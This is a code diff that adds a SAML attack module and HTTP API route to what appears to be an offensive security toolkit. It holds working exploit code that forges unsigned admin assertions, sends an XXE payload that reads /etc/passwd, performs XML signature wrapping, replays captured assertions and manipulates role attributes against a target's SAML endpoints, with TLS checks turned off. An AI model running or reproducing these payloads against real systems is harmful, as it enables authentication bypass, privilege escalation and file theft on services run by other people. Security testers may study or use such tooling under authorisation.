+    SAML_PATHS = ["/saml", "/saml/acs", "/saml/consume", "/auth/saml", "/sso/saml",
+                  "/api/saml", "/login/saml", "/saml/login", "/saml/callback",
+                  "/saml2/acs", "/Saml2/Acs", "/saml/SSO", "/sso"]
+
+    def _discover_saml_endpoints(self, base_url: str) -> List[str]:
+        found = []
+        for path in self.SAML_PATHS:
+            try:
+                r = requests.get(f"{base_url}{path}", timeout=5, verify=False, allow_redirects=False)
+                if r.status_code not in [404, 410]:
+                    found.append(f"{base_url}{path}")
+            except Exception:
+                pass
+        return found
+
+    def _build_minimal_assertion(self, username: str = "admin",
+                                  sp_entity: str = "https://target.com",
+                                  idp_entity: str = "https://attacker.com") -> str:
+        import base64
+        now = "2026-01-01T00:00:00Z"
+        xml = f"""<?xml version="1.0" encoding="UTF-8"?>
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
+                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
+                ID="_hexstrike" Version="2.0" IssueInstant="{now}"
+                Destination="{sp_entity}/saml/acs">
+  <saml:Issuer>{idp_entity}</saml:Issuer>
+  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
+  <saml:Assertion ID="_assert1" Version="2.0" IssueInstant="{now}">
+    <saml:Issuer>{idp_entity}</saml:Issuer>
+    <saml:Subject>
+      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">{username}</saml:NameID>
+      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+        <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z" Recipient="{sp_entity}/saml/acs"/>
+      </saml:SubjectConfirmation>
+    </saml:Subject>
+    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
+      <saml:AudienceRestriction><saml:Audience>{sp_entity}</saml:Audience></saml:AudienceRestriction>
+    </saml:Conditions>
+    <saml:AuthnStatement AuthnInstant="{now}">
+      <saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext>
+    </saml:AuthnStatement>
+    <saml:AttributeStatement>
+      <saml:Attribute Name="email"><saml:AttributeValue>{username}@target.com</saml:AttributeValue></saml:Attribute>
+      <saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
+    </saml:AttributeStatement>
+  </saml:Assertion>
+</samlp:Response>"""
+        return base64.b64encode(xml.encode()).decode()
+
+    def _test_unsigned_assertion(self, acs_url: str, username: str = "admin") -> Dict:
+        sp_base = acs_url.split("/saml")[0] if "/saml" in acs_url else acs_url.split("/sso")[0]
+        payload = self._build_minimal_assertion(username=username, sp_entity=sp_base)
+        try:
+            r = requests.post(acs_url, data={"SAMLResponse": payload}, timeout=10, verify=False, allow_redirects=False)
+            if r.status_code in [200, 302]:
+                body = r.text.lower()
+                if r.status_code == 302 or any(kw in body for kw in ["dashboard", "welcome", "session", "token", "logout"]):
+                    return {
+                        "type": "saml_unsigned_accepted",
+                        "severity": "CRITICAL",
+                        "url": acs_url,
+                        "note": "Server accepted unsigned SAML assertion",
+                    }
+        except Exception:
+            pass
+        return {}
+
+    def _test_xxe_in_saml(self, acs_url: str) -> Dict:
+        import base64
+        xxe_xml = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
+                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
+  <saml:Issuer>&xxe;</saml:Issuer>
+</samlp:Response>"""
+        payload = base64.b64encode(xxe_xml.encode()).decode()
+        try:
+            r = requests.post(acs_url, data={"SAMLResponse": payload}, timeout=10, verify=False)
+            if any(p in r.text.lower() for p in ["root:x:", "daemon:", "[extensions]"]):
+                return {
+                    "type": "saml_xxe",
+                    "severity": "CRITICAL",
+                    "url": acs_url,
+                    "note": "XXE in SAML assertion returned file content",
+                }
+        except Exception:
+            pass
+        return {}
+
+    def _test_signature_wrapping(self, acs_url: str, valid_response_b64: Optional[str] = None) -> List[Dict]:
+        import base64
+        findings = []
+        if not valid_response_b64:
+            return findings
+        try:
+            xml_str = base64.b64decode(valid_response_b64).decode("utf-8", errors="replace")
+            injected = xml_str.replace(
+                "<saml:Assertion",
+                '<saml:Assertion ID="_evil"><saml:Issuer>evil</saml:Issuer>'
+                '<saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject></saml:Assertion><saml:Assertion',
+                1,
+            )
+            payload = base64.b64encode(injected.encode()).decode()
+            r = requests.post(acs_url, data={"SAMLResponse": payload}, timeout=10, verify=False, allow_redirects=False)
+            if r.status_code in [200, 302]:
+                findings.append({
+                    "type": "saml_xsw",
+                    "severity": "CRITICAL",
+                    "url": acs_url,
+                    "note": "Server may be vulnerable to XML Signature Wrapping (XSW)",
+                })
+        except Exception:
+            pass
+        return findings
+
+    def _test_assertion_replay(self, acs_url: str, valid_response_b64: Optional[str] = None) -> Dict:
+        if not valid_response_b64:
+            return {}
+        try:
+            r = requests.post(acs_url, data={"SAMLResponse": valid_response_b64}, timeout=10, verify=False, allow_redirects=False)
+            if r.status_code in [200, 302]:
+                return {
+                    "type": "saml_replay",
+                    "severity": "HIGH",
+                    "url": acs_url,
+                    "note": "Captured assertion accepted again — no replay prevention",
+                }
+        except Exception:
+            pass
+        return {}
+
+    def _test_attribute_manipulation(self, acs_url: str) -> List[Dict]:
+        findings = []
+        for username, role in [("admin", "admin"), ("root", "superuser"), ("system", "administrator")]:
+            sp_base = acs_url.split("/saml")[0] if "/saml" in acs_url else acs_url.split("/sso")[0]
+            payload = self._build_minimal_assertion(username=username, sp_entity=sp_base)
+            try:
+                r = requests.post(acs_url, data={"SAMLResponse": payload}, timeout=10, verify=False, allow_redirects=False)
+                if r.status_code in [200, 302] and any(kw in r.text.lower() for kw in ["admin", "dashboard", "welcome", "manage"]):
+                    findings.append({
+                        "type": "saml_attribute_manipulation",
+                        "username": username,
+                        "role": role,
+                        "severity": "CRITICAL",
+                        "url": acs_url,
+                    })
+            except Exception:
+                pass
+        return findings
+
+    def run(self, target: str, acs_url: Optional[str] = None,
+            valid_saml_response: Optional[str] = None,
+            run_discover: bool = True, run_unsigned: bool = True,
+            run_xxe: bool = True, run_xsw: bool = True,
+            run_replay: bool = True, run_attr: bool = True) -> Dict:
+        start = time.time()
+        base_url = target.rstrip("/")
+        findings: List[Dict] = []
+
+        endpoints = [acs_url] if acs_url else []
+        if run_discover:
+            endpoints.extend(self._discover_saml_endpoints(base_url))
+
+        for ep in list(set(e for e in endpoints if e)):
+            if run_unsigned:
+                r = self._test_unsigned_assertion(ep)
+                if r: findings.append(r)
+            if run_xxe:
+                r = self._test_xxe_in_saml(ep)
+                if r: findings.append(r)
+            if run_xsw:
+                findings.extend(self._test_signature_wrapping(ep, valid_saml_response))
+            if run_replay:
+                r = self._test_assertion_replay(ep, valid_saml_response)
+                if r: findings.append(r)
+            if run_attr:
+                findings.extend(self._test_attribute_manipulation(ep))
+
+        critical = sum(1 for f in findings if f.get("severity") == "CRITICAL")
+        high     = sum(1 for f in findings if f.get("severity") == "HIGH")
+
+        return {
+            "target": target,
+            "endpoints_tested": list(set(e for e in endpoints if e)),
+            "findings": findings,
+            "critical": critical,
+            "high": high,
+            "duration_sec": round(time.time() - start, 2),
+        }
+
+
+saml_attacker = SAMLAttacker()
+
+
+@app.route("/api/tools/saml/attack", methods=["POST"])
+def saml_attack_route():
+    try:
+        data = request.get_json() or {}
+        result = saml_attacker.run(
+            target=data.get("target", ""),
+            acs_url=data.get("acs_url"),
+            valid_saml_response=data.get("valid_saml_response"),
+            run_discover=data.get("run_discover", True),
+            run_unsigned=data.get("run_unsigned", True),
+            run_xxe=data.get("run_xxe", True),
+            run_xsw=data.get("run_xsw", True),
+            run_replay=data.get("run_replay", True),
+            run_attr=data.get("run_attr", True),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 saml/attack error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
 # Create the banner after all classes are defined
 BANNER = ModernVisualEngine.create_banner()
 
